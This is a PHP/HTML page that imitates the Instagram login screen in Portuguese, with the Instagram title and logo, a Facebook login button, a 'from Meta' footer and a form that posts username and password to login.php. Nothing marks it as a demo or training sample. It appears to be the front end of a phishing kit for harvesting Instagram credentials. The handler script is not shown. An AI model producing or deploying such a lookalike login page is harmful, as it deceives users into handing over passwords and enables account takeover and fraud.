<?php
  session_start();
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    *{
  margin: 0;
  padding: 0;
  box-sizing: border-box;
  outline: none;
}
body{
  font-family: 'Arial';
  background-color: #fafafa;
}
.header, .menu{
  display: flex;
  align-items: center;
  justify-content: center;
}
.header img{
  height: 150px;
  width: 250px;
}
.menu p{
  padding-top: 50px;
  color: #999;
  font-size: 13.5px;
}
span{
  transform: rotate(50deg);
}
button, input[type="submit"]{
  width: 230px;
  height: 35px;
  color: #fff;
  background-color: #54afe8;
  border-radius: 8px;
  border: solid 1px #fafafa;
  cursor: pointer;
}
.hr{
  display: flex;                             align-items: center;
  color: #4b4f56;                            justify-content: center;                 }
.hrr{
  width: 87px;                                margin: 1em;                               border: solid 1px #ccd0d5;               }
  input[type="text"], input[type="password"]{
    width: 225px;
    height: 35px;
    padding-left: 0.3em;
    margin-bottom: 0.2cm;
    background-color: #fefefe;
    border: solid 1px #999;
    border-radius: 2.5px;
  }
  a{
    color: #1cafc9;
    text-decoration: none;
  }
  .link{
    width: 235px;
    font-size: 14px;
    text-align: right;
  }
  
  #p{
    text-align: center;
    color: #999;
  }
  footer{
    text-align: center;
    padding: 0.5cm;
    font-variant: small-caps;
    color: #999;
  }
  .error{
    margin: 0.2cm;
    color: #e87878;
  }
  </style>
  <title>Instagram</title>
</head>
<body>
  <div class="menu">
    <p>Português (Portugal)</p>
  </div>
  <header class="header">
    <img src="logo.png" alt="instagram">
  </header>
  <div class="login-area">
    <center>
      <a href="#"><button>Continuar com o Facebook</button></a>
          <form action="login.php" method="POST">
      <div class="hr">
        <hr class="hrr">OU<hr class="hrr">
      </div>
 <?php
   if(isset($_SESSION["err"])):
 ?>
 <div class="error">Algo deu errado!</div>
 <?php
   unset($_SESSION["err"]);
   endif;
  ?>  
      <input type="text" name="username" id="username" placeholder="Número de telemóvel, nome de uti..." required><br>
      <input type="password" name="password" id="password" placeholder="Palavra-passe" required>
      <div class="link">
        <a href="#">Esqueceste-te da palavra-passe? </a><br><br><input type="hidden">
        <input type="submit" value="Iniciar Sessão">
        <p id="p"><br><br>Não tens uma conta? <a href="#"><b>Regista-te.</b></a></p>
      </div>
    </center>
    </form>
  </div>
  <footer>
    from<br><img src="meta.png" alt="meta">
  <br><br></footer>
</body>
</html>
